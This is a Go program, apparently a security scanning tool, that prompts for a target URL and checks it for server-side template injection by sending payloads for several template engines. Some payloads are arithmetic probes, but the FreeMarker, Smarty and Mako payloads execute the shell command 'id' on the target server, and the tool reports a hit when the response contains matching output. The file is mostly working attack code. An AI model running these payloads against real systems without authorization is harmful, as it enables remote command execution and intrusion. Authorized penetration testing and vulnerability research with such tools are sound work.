package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"time"
)

var payloads = map[string]string{
	"jinja2":     "{{7*7}}",
	"django":     "{{7*'7'}}",
	"twig":       "{{7*7}}",
	"velocity":   "$7*7",
	"freemarker": "<#assign ex = 'freemarker.template.utility.Execute'?new()>${ ex('id') }",
	"smarty":     "{php}echo `id`;{/php}",
	"mako":       "<% import os %>${ os.popen('id').read() }",
}

func checkSSTI(targetURL string) {
	client := &http.Client{Timeout: 5 * time.Second}

	for template, payload := range payloads {
		query := "?input=" + url.QueryEscape(payload)
		resp, err := client.Get(targetURL + query)
		if err != nil {
			fmt.Printf("[!] Error checking %s: %v\n", targetURL, err)
			continue
		}
		defer resp.Body.Close()

		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			fmt.Printf("[!] Error reading response body: %v\n", err)
			continue
		}

		if resp.StatusCode == 200 {
			matched, _ := regexp.MatchString(`49|7777777|uid=\d+\(\w+\)`, string(body))
			if matched {
				fmt.Printf("[+] Potential SSTI vulnerability detected using %s syntax at %s\n", template, targetURL)
				fmt.Printf("[*] Response: %s\n", string(body))
				return
			}
		}
	}
	fmt.Println("[-] No SSTI vulnerability detected.")
}

func main() {
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("Enter the target URL to check for SSTI vulnerabilities: ")
	targetURL, _ := reader.ReadString('\n')

	// حذف کاراکترهای اضافی مانند newline
	targetURL = strings.TrimSpace(targetURL)

	fmt.Printf("[*] Checking SSTI vulnerabilities for: %s\n", targetURL)
	checkSSTI(targetURL)
}
